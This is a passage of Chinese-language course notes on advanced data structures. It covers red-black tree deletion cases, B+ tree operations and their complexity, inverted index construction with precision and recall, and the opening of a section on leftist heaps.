<p>根据距离划分为近、远侄子，用远近而不用左右是为了对称情况不混淆左右</p>
</div>
<div align=center><img src="../NOTE/ADS/part1/8.png" width=60%?/></div>

<p>此时没有红色能救一下了,我们就把希望寄托于父节点,因为根节点一定能救,所以此时的做法就是将这一层的黑色往上推,将X的一层黑色去掉,将兄弟染红,父亲给一层黑色,如果父亲是红色,那么直接染黑即可,如果父亲是黑色,那么就又多了一层黑色</p>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>如果情况2是情况1演变而来的,那么X的父节点一定是红色,此时问题可以直接解决</p>
</div>
<ul>
<li>情况3:X 的兄弟是黑色的，且近侄子是红色,远侄子是黑色</li>
</ul>
<div align=center><img src="../NOTE/ADS/part1/9.png" width=60%?/></div>

<div class="language-text highlight"><pre><span></span><code>
</code></pre></div>
<p>这时我们借用 AVL 树的想法，红色在父亲 P 的 RL 位置，因此做 single rotation 后会变成情况 4 的 RR 的情况</p>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>也就意味着红色要给到 RR 的位置，这里有一个颜色的变化，用 RR 记
忆很方便</p>
</div>
<ul>
<li>情况4:X 的兄弟是黑色的，且远侄子是红色,近侄子是任意颜色</li>
</ul>
<div align=center><img src="../NOTE/ADS/part1/10.png" width=60%?/></div>

<p>此时对应 AVL 树的 RR，于是再一次 single rotation 即可把双黑的一重黑丢给红色远侄子（即 X 和 N2 都变成黑色），但要注意为了保证红黑树性质的颜色变化，如果 P 一开始是黑色,那么旋转前后到N2的路径上黑色结点数目不变，都是2,如果P是红色,那么旋转前后到N2的路径上黑色结点数目增多，此时需要将S染红，P染黑,总的来说,可以交换P和S的颜色</p>
<div class="admonition quote">
<p class="admonition-title">吴一航学长的ADS讲义</p>
<p>首先我们最多用 <span class="arithmatex">\(O(\log n)\)</span> 的时间找到删除结点，
最多 1 次交换和 1 个删除的操作。接下来如果删除后没有问题则到此结束；否则根据分析，情况 1、3和 4 在问题解决前最多进去一次，因为 4 可以直接解决，3 直接进入 4 然后解决，1 如果进入 3 和 4也可以马上解决，进入 2 后也因为父结点是红色可以马上解决。因此关键在于情况 2 可能出现很多次，但最多也只是树高 <span class="arithmatex">\(O(\log n)\)</span> 次，因为每次都会上推 1 格。总而言之，因为情况 1、3 和 4 在问题解决前最多进去一次，所以最多 3 次旋转加上 <span class="arithmatex">\(O(\log n)\)</span> 次颜色调整可以解决问题</p>
</div>
<details class="question">
<summary>Question</summary>
<p>考虑将一个结点 X 插入红黑树 T0，得到红黑树 T1，然后紧接着下一步操作又立刻将 X 从 T1 删除得到 T2，请问 T0 和 T2 是否一定一样？若是，请给出清晰的证明；若不是，请举出反例。</p>
<p><div align=center><img src="../NOTE/ADS/part1/11.png" width=60%?/></div></p>
</details>
<h2 id="note-ads-wk2-b_1">B+树<a class="headerlink" href="#note-ads-wk2-b_1" title="Permanent link">&para;</a></h2>
<div class="admonition definition">
<p class="admonition-title">Definition</p>
<p>A <strong>B+ tree</strong> of order ** <span class="arithmatex">\(M\)</span> ** is a tree with the following properties:</p>
<ul>
<li>The root is either a leaf or has between <span class="arithmatex">\(2\)</span> and <span class="arithmatex">\(M\)</span> children.</li>
<li>All noneleaf nodes (except the root) have between $ \lceil \frac{M}{2} \rceil $ and <span class="arithmatex">\(M\)</span> children.</li>
<li>All leaves are at the same depth.</li>
</ul>
</div>
<p>与红黑树的定义比起来，B+树的的定义就显得更为简单，我们只需要每个结点中储存的键值个数的限制和孩子个数的限制，以及所有键值都在叶节点中有存储。</p>
<div class="admonition question">
<p class="admonition-title">Question</p>
<ul>
<li>为什么根节点的孩子个数从2开始？</li>
</ul>
<p>因为一开始插入到根结点爆炸时，根节点只能分裂成两个孩子</p>
<ul>
<li>为什么非叶子结点的孩子个数要求是 <span class="arithmatex">\(\lceil \frac{M}{2} \rceil\)</span> ？</li>
</ul>
<p>是因为插入到爆炸的时候就是分裂到这个数量 </p>
<ul>
<li>注意非叶子节点孩子个数的限制是 <span class="arithmatex">\(\lceil \frac{M}{2} \rceil\)</span>，如果问的是key的个数，那么是 <span class="arithmatex">\(\lceil \frac{M}{2} \rceil-1\)</span></li>
</ul>
</div>
<h3 id="note-ads-wk2-b_2">B+树搜索<a class="headerlink" href="#note-ads-wk2-b_2" title="Permanent link">&para;</a></h3>
<p>根据 B+ 树定义，需要在非叶结点层逐层和存储的键值比较从而确定去哪一个孩子结点。
因此时间复杂度有两个重要因素：一个是树的高度，另一个是每一层搜索需要的时间。树的高度非常好计算，最差的情况也是每个结点都存 <span class="arithmatex">\(\lceil \frac{M}{2} \rceil\)</span> 个结点，因此最大高度是 <span class="arithmatex">\(O(\log_{⌈M/2⌉} N)\)</span> 的。
然后每一层因为键值是排好序的，因此用二分查找找到要去哪个孩子结点，复杂度为 <span class="arithmatex">\(O(\log_2 M)\)</span>，综合可得搜索的时间复杂度为</p>
<div class="arithmatex">\[
    O(\log_2M \cdot \log_{⌈M/2⌉} N) = (\log_2 \frac{M}{2}+1) \cdot \frac{\log_2 N}{\log_2 \frac{M}{2}} = O(\log N)
\]</div>
<h3 id="note-ads-wk2-b_3">B+树插入<a class="headerlink" href="#note-ads-wk2-b_3" title="Permanent link">&para;</a></h3>
<p>伪代码如下</p>
<div class="language-Cpp highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk2-__codelineno-0-1"></a><span class="n">Btree</span><span class="w">  </span><span class="nf">Insert</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ElementType</span><span class="w"> </span><span class="n">X</span><span class="p">,</span><span class="w">  </span><span class="n">Btree</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk2-__codelineno-0-2"></a><span class="p">{</span><span class="w"> </span><span class="n">Search</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">leaf</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">proper</span><span class="w"> </span><span class="n">leaf</span><span class="w"> </span><span class="n">node</span><span class="p">;</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk2-__codelineno-0-3"></a><span class="n">Insert</span><span class="w"> </span><span class="n">X</span><span class="p">;</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk2-__codelineno-0-4"></a><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="k">this</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">M</span><span class="o">+</span><span class="mi">1</span><span class="w"> </span><span class="n">keys</span><span class="w"> </span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ads-wk2-__codelineno-0-5"></a><span class="p">{</span><span class="n">split</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">nodes</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="p">(</span><span class="n">M</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="n">M</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="w">  </span><span class="n">keys</span><span class="p">,</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ads-wk2-__codelineno-0-6"></a><span class="w"> </span><span class="n">respectively</span><span class="p">;</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ads-wk2-__codelineno-0-7"></a><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="k">this</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">root</span><span class="p">)</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ads-wk2-__codelineno-0-8"></a><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">two</span><span class="w"> </span><span class="n">children</span><span class="p">;</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ads-wk2-__codelineno-0-9"></a><span class="n">check</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">parent</span><span class="p">;</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#note-ads-wk2-__codelineno-0-10"></a><span class="p">}</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#note-ads-wk2-__codelineno-0-11"></a><span class="p">}</span>
</span></code></pre></div>
<div class="admonition key-point">
<p class="admonition-title">Key-point</p>
<p>分裂时，以右半部分的最小孩子作为分裂后的索引，例如 2-3 树，根节点为（1,2,3）,插入4之后，分裂为（1,2）和（3,4）,根节点变为3，左孩子为（1,2）,右孩子为(3,4)</p>
</div>
<p>就是找到插入的位置，然后插入看结点是否放得下，放不下就分裂，如果分裂后子结点个数也过多则继续向上一层分裂，直到根结点孩子爆满则将根结点分
裂并生成新的根结点，当然还要注意即使不分裂也可能需要按 B+ 树定义更新上层结点。我们知道树有 $O(\log_{⌈M/2⌉} N) $层，每层操作最多是 <span class="arithmatex">\(O(M)\)</span> 的（如更新结点或者分裂，无非就是更改 <span class="arithmatex">\(O(M)\)</span> 个
键值以及修改 <span class="arithmatex">\(O(M)\)</span> 个父子指针），因此整体时间复杂度为 </p>
<div class="arithmatex">\[O(M \cdot \log_{⌈M/2⌉} N) = O(\frac{M}{\log M} \log N)\]</div>
<h3 id="note-ads-wk2-b_4">B+树删除<a class="headerlink" href="#note-ads-wk2-b_4" title="Permanent link">&para;</a></h3>
<p>想法很简单，因为只需把插入时分裂结点改为合并键值或孩子数量少的
结点，当然需要注意的是，为了确保合并后键值数量不会超过 M 且减少合并次数，可以先看看兄
弟结点是不是键值还很多，多的话拿一个过来即可，事实上整体时间复杂度和插入分析类似，也
为 
<span class="arithmatex">\(O(\frac{M}{\log M} \log N)\)</span></p></section><section class="print-page" id="note-ads-wk3_1" heading-number="2.2.3.4"><h1 id="note-ads-wk3_1-_1">倒排索引<a class="headerlink" href="#note-ads-wk3_1-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 716 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 25 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 4 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 3 分钟</p>
</div>
<p>倒排文件是一种数据结构，它存储了某个特定词汇在文本中所有出现位置的索引。这些索引可以是页面编号、行号或文本中的具体位置等。简而言之，倒排文件就是一种记录了词汇出现位置的地图，便于快速检索到该词汇在文档中的所有出现点。</p>
<div align=center><img src="../NOTE/ADS/part1/12.png" width="80%"></div>

<p>储存其出现的频率是因为从出现次数较少的词汇中找到的文档更有可能是相关文档。而且，出现次数较少的词汇更有可能是特定的词汇，因此更有可能是相关文档。</p>
<p>构建倒排索引：
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#note-ads-wk3_1-__codelineno-0-1"></a><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#note-ads-wk3_1-__codelineno-0-2"></a><span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">term</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#note-ads-wk3_1-__codelineno-0-3"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Find</span><span class="p">(</span><span class="w"> </span><span class="n">Dictionary</span><span class="p">,</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">false</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#note-ads-wk3_1-__codelineno-0-4"></a><span class="w">            </span><span class="n">Insert</span><span class="p">(</span><span class="w"> </span><span class="n">Dictionary</span><span class="p">,</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#note-ads-wk3_1-__codelineno-0-5"></a><span class="w">        </span><span class="n">Get</span><span class="w"> </span><span class="n">T</span><span class="err">’</span><span class="n">s</span><span class="w"> </span><span class="n">posting</span><span class="w"> </span><span class="n">list</span><span class="p">;</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#note-ads-wk3_1-__codelineno-0-6"></a><span class="w">        </span><span class="n">Insert</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">T</span><span class="err">’</span><span class="n">s</span><span class="w"> </span><span class="n">posting</span><span class="w"> </span><span class="n">list</span><span class="p">;</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#note-ads-wk3_1-__codelineno-0-7"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#note-ads-wk3_1-__codelineno-0-8"></a><span class="p">}</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#note-ads-wk3_1-__codelineno-0-9"></a><span class="n">Write</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">inverted</span><span class="w"> </span><span class="n">index</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">disk</span><span class="p">;</span>
</span></code></pre></div></p>
<p>需要考虑很多问题</p>
<ul>
<li>
<p>Steaming: 词汇的变形问题，如“run”和“running”是同一个词汇的不同形式。没必要分别储存</p>
</li>
<li>
<p>Stop words：在搜索引擎中没有实际意义的词汇，如“a”、“an”、“the”等。在倒排文件中，这些词汇的储存会占用大量的空间，而且对搜索结果没有实际意义。</p>
</li>
<li>
<p>搜索的方式：search树、哈希表；树查询比较慢，范围查询比较块；哈希表查询比较快，但是范围查询比较慢，而且需要考虑哈希冲突的问题。</p>
</li>
<li>
<p>内存管理</p>
</li>
</ul>
<div class="language-cpp highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#note-ads-wk3_1-__codelineno-1-1"></a><span class="w">  </span><span class="n">BlockCnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#note-ads-wk3_1-__codelineno-1-2"></a><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">document</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#note-ads-wk3_1-__codelineno-1-3"></a><span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">read</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">term</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">D</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#note-ads-wk3_1-__codelineno-1-4"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">memory</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#note-ads-wk3_1-__codelineno-1-5"></a><span class="w">      </span><span class="n">Write</span><span class="w"> </span><span class="n">BlockIndex</span><span class="p">[</span><span class="n">BlockCnt</span><span class="p">]</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">disk</span><span class="p">;</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#note-ads-wk3_1-__codelineno-1-6"></a><span class="w">      </span><span class="n">BlockCnt</span><span class="w"> </span><span class="o">++</span><span class="p">;</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#note-ads-wk3_1-__codelineno-1-7"></a><span class="w">      </span><span class="n">FreeMemory</span><span class="p">;</span>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#note-ads-wk3_1-__codelineno-1-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#note-ads-wk3_1-__codelineno-1-9"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">Find</span><span class="p">(</span><span class="w"> </span><span class="n">Dictionary</span><span class="p">,</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nb">false</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#note-ads-wk3_1-__codelineno-1-10"></a><span class="w">      </span><span class="n">Insert</span><span class="p">(</span><span class="w"> </span><span class="n">Dictionary</span><span class="p">,</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="p">);</span>
</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#note-ads-wk3_1-__codelineno-1-11"></a><span class="w">    </span><span class="n">Get</span><span class="w"> </span><span class="n">T</span><span class="err">’</span><span class="n">s</span><span class="w"> </span><span class="n">posting</span><span class="w"> </span><span class="n">list</span><span class="p">;</span>
</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#note-ads-wk3_1-__codelineno-1-12"></a><span class="w">    </span><span class="n">Insert</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">node</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">T</span><span class="err">’</span><span class="n">s</span><span class="w"> </span><span class="n">posting</span><span class="w"> </span><span class="n">list</span><span class="p">;</span>
</span><span id="__span-1-13"><a id="__codelineno-1-13" name="__codelineno-1-13" href="#note-ads-wk3_1-__codelineno-1-13"></a><span class="w">  </span><span class="p">}</span>
</span><span id="__span-1-14"><a id="__codelineno-1-14" name="__codelineno-1-14" href="#note-ads-wk3_1-__codelineno-1-14"></a><span class="p">}</span>
</span><span id="__span-1-15"><a id="__codelineno-1-15" name="__codelineno-1-15" href="#note-ads-wk3_1-__codelineno-1-15"></a><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">&lt;</span><span class="n">BlockCnt</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="w"> </span><span class="p">)</span>
</span><span id="__span-1-16"><a id="__codelineno-1-16" name="__codelineno-1-16" href="#note-ads-wk3_1-__codelineno-1-16"></a><span class="n">Merge</span><span class="p">(</span><span class="w"> </span><span class="n">InvertedIndex</span><span class="p">,</span><span class="w"> </span><span class="n">BlockIndex</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="p">);</span>
</span></code></pre></div>
<ul>
<li>分布式索引：将倒排索引分布在多个服务器上，每个服务器负责一部分索引。这样可以提高搜索的效率，减少单个服务器的负载。</li>
</ul>
<div align=center><img src="../NOTE/ADS/part1/13.png" width="80%"></div>

<ul>
<li>压缩存储</li>
</ul>
<div align=center><img src="../NOTE/ADS/part1/14.png" width="80%"></div>

<p>将stop words去掉，存储时存储每个单词的长度而不是其首字母出现的位置，这样可以避免大数字的存储。</p>
<ul>
<li>文档阈值的控制</li>
</ul>
<div align=center><img src="../NOTE/ADS/part1/15.png" width="80%"></div>

<ol>
<li>
<p><strong>文档阈值控制</strong>：</p>
<ul>
<li>只检索按照权重排名的前 <code>x</code> 个文档。</li>
<li>不适用于布尔查询，因为布尔查询通常需要返回所有匹配的文档，而不是按相关性排序的子集。</li>
<li>缺点是由于截断可能会遗漏一些相关的文档，即只选择排名靠前的文档，可能会忽略重要的文档。</li>
</ul>
</li>
<li>
<p><strong>查询阈值控制</strong>：</p>
<ul>
<li>将查询词按照词频升序排列（从最不常见的词到最常见的词）。</li>
<li>系统根据原始查询词的某个百分比进行搜索。图中显示了按 20%、40%、80% 的比例使用查询词（从 T1 到 T10）</li>
</ul>
</li>
</ol>
<p>搜索的性能衡量指标有两个：<strong>召回率**和**准确率</strong>。召回率(能搜索到多少)是指检索到的相关文档数与系统中所有相关文档数的比值，准确率(正确的是多少)是指检索到的相关文档数与检索到的文档总数的比值。</p>
<table>
<thead>
<tr>
<th style="text-align: center;"></th>
<th style="text-align: center;">Relevant</th>
<th style="text-align: center;">Irrelevant</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">Retrieved</td>
<td style="text-align: center;"><span class="arithmatex">\(R_R\)</span></td>
<td style="text-align: center;"><span class="arithmatex">\(I_R\)</span></td>
</tr>
<tr>
<td style="text-align: center;">Not Retrieved</td>
<td style="text-align: center;"><span class="arithmatex">\(R_N\)</span></td>
<td style="text-align: center;"><span class="arithmatex">\(I_N\)</span></td>
</tr>
</tbody>
</table>
<p>Perscision = <span class="arithmatex">\(\dfrac{R_R}{R_R+I_R}\)</span></p>
<p>Recall = <span class="arithmatex">\(\dfrac{R_R}{R_R+R_N}\)</span></p></section><section class="print-page" id="note-ads-wk3_2" heading-number="2.2.3.5"><h1 id="note-ads-wk3_2-_1">左式堆与斜堆<a class="headerlink" href="#note-ads-wk3_2-_1" title="Permanent link">&para;</a></h1>
<div style="margin-top: -30px; font-size: 0.75em; opacity: 0.7;">
<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2A10 10 0 0 0 2 12a10 10 0 0 0 10 10 10 10 0 0 0 10-10h-2a8 8 0 0 1-8 8 8 8 0 0 1-8-8 8 8 0 0 1 8-8zm6.78 1a.7.7 0 0 0-.48.2l-1.22 1.21 2.5 2.5L20.8 5.7c.26-.26.26-.7 0-.95L19.25 3.2c-.13-.13-.3-.2-.47-.2m-2.41 2.12L9 12.5V15h2.5l7.37-7.38z"/></svg></span> 约 3467 个字 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M392.8 1.2c-17-4.9-34.7 5-39.6 22l-128 448c-4.9 17 5 34.7 22 39.6s34.7-5 39.6-22l128-448c4.9-17-5-34.7-22-39.6m80.6 120.1c-12.5 12.5-12.5 32.8 0 45.3l89.3 89.4-89.4 89.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0l112-112c12.5-12.5 12.5-32.8 0-45.3l-112-112c-12.5-12.5-32.8-12.5-45.3 0zm-306.7 0c-12.5-12.5-32.8-12.5-45.3 0l-112 112c-12.5 12.5-12.5 32.8 0 45.3l112 112c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L77.3 256l89.4-89.4c12.5-12.5 12.5-32.8 0-45.3"/></svg></span> 78 行代码 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 17H7V3h14m0-2H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V3a2 2 0 0 0-2-2M3 5H1v16a2 2 0 0 0 2 2h16v-2H3m12.96-10.71-2.75 3.54-1.96-2.36L8.5 15h11z"/></svg></span> 2 张图片 <span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 20c4.42 0 8-3.58 8-8s-3.58-8-8-8-8 3.58-8 8 3.58 8 8 8m0-18c5.5 0 10 4.5 10 10s-4.5 10-10 10C6.47 22 2 17.5 2 12S6.5 2 12 2m.5 11H11V7h1.5v4.26l3.7-2.13.75 1.3z"/></svg></span> 预计阅读时间 13 分钟</p>
</div>
<h2 id="note-ads-wk3_2-_2">左式堆<a class="headerlink" href="#note-ads-wk3_2-_2" title="Permanent link">&para;</a></h2>
<p>在有的情况下，我们需要进行堆的合并操作，左式堆就是为了在merge操作中提供更好的性能。</p>
<h3 id="note-ads-wk3_2-_3">定义<a class="headerlink" href="#note-ads-wk3_2-_3" title="Permanent link">&para;</a></h3>
<div class="admonition definition">
<p class="admonition-title">NPL</p>
<p>一个节点X的 NPL(Null Path Length) ，NPL(X)定义为从 X 到一个没有两个儿子的结点的最短路径的长。因此，具有 0 个或 1 个儿子的结点的 Npl 为 0，且规定 Npl(null)=-1</p>
<div class="arithmatex">\[
NPL(X) = 1+min(NPL(left), NPL(right))
\]</div>
</div>
<div class="admonition definition">
<p class="admonition-title">左式堆-leftist Heap</p>
<p>每个结点的左孩子的 Npl 都要大于等于其右孩子的 Npl。注意这一定义适用于没有两个孩子的结点，因为有定义 Npl(null)=-1</p>
</div>
<p>向左边倾斜有一个很好的性质</p>
<h3 id="note-ads-wk3_2-_4">性质<a class="headerlink" href="#note-ads-wk3_2-_4" title="Permanent link">&para;</a></h3>
<p>在右路径上有 <span class="arithmatex">\(r\)</span> 个结点的左式堆必然至少有 <span class="arithmatex">\(2^r − 1\)</span> 个结点（右路径指从根结点出发一路找右孩子直到找到叶子的路径）。</p>
<p>这一定义指出：若一共有 <span class="arithmatex">\(n\)</span> 个结点，那么右路径上的结点个数至多为 <span class="arithmatex">\(\log(n + 1)\)</span>，因此左式堆的右路径结点数至多为 <span class="arithmatex">\(\log(n + 1)=O(\log n)\)</span>。</p>
<div class="admonition proof">
<p class="admonition-title">Proof</p>
<p>我们可以使用数学归纳法证明这一性质</p>
